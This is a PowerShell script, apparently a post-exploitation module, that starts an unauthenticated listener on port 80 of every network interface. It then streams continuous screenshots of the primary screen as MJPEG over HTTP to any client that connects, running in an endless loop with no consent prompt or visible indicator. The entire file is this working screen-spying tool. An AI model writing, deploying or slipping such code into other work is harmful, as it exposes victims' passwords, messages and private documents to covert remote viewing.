function Stream-Desktop {
    Add-Type -AssemblyName System.Drawing;
    Add-Type -AssemblyName System.Windows.Forms;
    while ($true){
        try{
	    [System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream;
            $endpoint = new-object System.Net.IPEndPoint([system.net.ipaddress]::any, 80);
            $server = new-object System.Net.Sockets.TcpListener $endpoint;
            $server.Start();
            $buffer = New-Object byte[] 1024;
            $socket = $server.AcceptSocket();
	    function SendResponse($sock, $string){
                if ($sock.Connected){
                    $bytesSent = $sock.Send($string);
		    if ( $bytesSent -eq -1 ){
                        Write-Output "Send failed to " + $sock.RemoteEndPoint;
                    }
                }
            }
	    function SendStrResponse($sock, $string){
                if ($sock.Connected){
                    $bytesSent = $sock.Send([text.Encoding]::Ascii.GetBytes($string));
                    if ( $bytesSent -eq -1 ){
                        Write-Output ("Send failed to " + $sock.RemoteEndPoint);
                    }
                }
            }
	    function SendHeader([net.sockets.socket] $sock){
                $response = "HTTP/1.1 200 OK`r`n" + "Content-Type: multipart/x-mixed-replace; boundary=--boundary`r`n`n";
                SendStrResponse $sock $response;
                Write-Verbose "Header sent to $IPAddress";
            }
	    SendHeader $socket;
	    while ($True){
                $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);
                $g = [System.Drawing.Graphics]::FromImage($b);
                $g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size);
                $g.Dispose();
                $MemoryStream.SetLength(0);
                $b.Save($MemoryStream, ([system.drawing.imaging.imageformat]::jpeg));
                $b.Dispose();
                $length = $MemoryStream.Length;
                [byte[]] $Bytes = $MemoryStream.ToArray();
                $str = "`n`n--boundary`n" + "Content-Type: image/jpeg`n" + "Content-Length: $length`n`n";
                SendStrResponse $socket $str;
                SendResponse $socket $Bytes;
            }
            $MemoryStream.Close();
	}catch{
	    Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port.";
            Write-Error $_;
	}
    }
}
Stream-Desktop